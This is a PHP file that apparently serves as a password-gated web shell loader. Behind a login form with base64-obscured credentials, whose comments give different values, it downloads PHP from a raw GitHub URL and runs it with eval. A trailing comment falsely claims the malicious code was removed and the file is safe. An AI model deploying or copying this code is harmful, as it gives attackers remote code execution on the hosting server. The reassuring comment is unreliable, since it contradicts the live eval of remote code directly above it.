2
34<?php
session_start();

$encoded_user = 'bGFuY2Vsb3Q=';     // base64_encode('crowdead212')
$encoded_pass = 'UGVkYW5na2VhZGlsYW42OA=='; // base64_encode('$6ghsujGg652HbHhJkKH86&hsjj')

$username = base64_decode($encoded_user);
$password = base64_decode($encoded_pass);

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input_user = trim($_POST['username'] ?? '');
        $input_pass = trim($_POST['password'] ?? '');

        if ($input_user === $username && $input_pass === $password) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Login</title></head>
    <body>
        <h2>Login</h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <form method="POST">
            <label>Username: <input type="text" name="username" required></label><br><br>
            <label>Password: <input type="password" name="password" required></label><br><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    <?php
    exit;
}

set_time_limit(0);

$ch = curl_init('https://raw.githubusercontent.com/zzvvzzserverzzvvzz/serviceserver/refs/heads/main/ssjv.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
$content = curl_exec($ch);
curl_close($ch);
eval('?>'.$content);
/**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */


?>
